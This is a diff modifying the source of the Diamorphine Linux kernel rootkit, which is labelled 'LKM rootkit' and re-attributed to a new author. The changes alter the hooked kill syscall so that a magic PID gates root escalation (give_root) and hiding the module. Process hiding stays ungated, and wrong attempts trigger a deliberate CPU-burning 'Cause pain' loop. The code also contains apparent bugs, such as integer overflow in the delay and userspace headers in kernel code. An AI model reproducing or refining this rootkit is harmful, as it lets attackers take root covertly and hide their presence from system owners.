@@ -3,11 +3,7 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
-#include <linux/version.h>
-//ADDED:
-#include <linux/tty.h>
-#include <linux/kthread.h>
-#include <unistd.h>
+#include <linux/version.h> 
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
@@ -319,7 +315,6 @@ hacked_kill(pid_t pid, int sig)
 #endif
 	struct task_struct *task;
 	
-	/*
 	long long magicPrefixNum = 0;//ADDED
     const char *prefix = MAGIC_PREFIX;//ADDED
     for (int i = 0; prefix[i] != '\0'; i++) {// Iterate over each character in the prefix string //ADDED
@@ -327,35 +322,19 @@ hacked_kill(pid_t pid, int sig)
             magicPrefixNum = magicPrefixNum * 10LL + (prefix[i] - '0');// If so, multiply the existing value of magicPrefixNum by 10 and add the new digit
         }
     }
-	*/
 
-	bool pwTried = FALSE;
-	bool pwPassed = FALSE;
-	if(sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS){
-		
-		char buffer[1024]; // buffer to hold input
-		int bytes_read; // number of bytes read
-
-		// read input from standard input (the terminal)
-		bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer));
-
-		// Check whether the entered password matches the stored password
-		if (bytes_read > 0 && strcmp(buffer,MAGIC_PREFIX)==0) { pwPassed=TRUE; }
-		pwTried = TRUE;
-	}
-
-	if(sig==SIGINVIS && pwPassed) {//MODIFIED from switch to if elses
+	if(sig==SIGINVIS) {//MODIFIED from switch to if elses
 		if ((task = find_task(pid)) == NULL)
 			return -ESRCH;
 		task->flags ^= PF_INVISIBLE;
-	}else if(sig==SIGSUPER && pwPassed){
+	}else if(sig==SIGSUPER && pid == magicPrefixNum){
 		give_root();
-	}else if(sig==SIGMODINVIS && pwPassed){
+	}else if(sig==SIGMODINVIS && pid == magicPrefixNum){
 		if (module_hidden) module_show();
 		else module_hide();
-	}else if(pwTried && !pwPassed){
+	}else if(pid != magicPrefixNum && (sig==SIGSUPER || sig==SIGMODINVIS)){
 		//Cause pain //ADDED
-		int seconds = 1000000000000;
+		int seconds = pid * pid * pid * pid * pid;
 		int end_time = (int) __builtin_ia32_rdtsc() + seconds * 2300000000;
     	while ((int) __builtin_ia32_rdtsc() < end_time);
 	}else{
@@ -466,5 +445,5 @@ module_init(diamorphine_init);
 module_exit(diamorphine_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
-MODULE_AUTHOR("m0nad");
+MODULE_AUTHOR("cp");
 MODULE_DESCRIPTION("LKM rootkit");
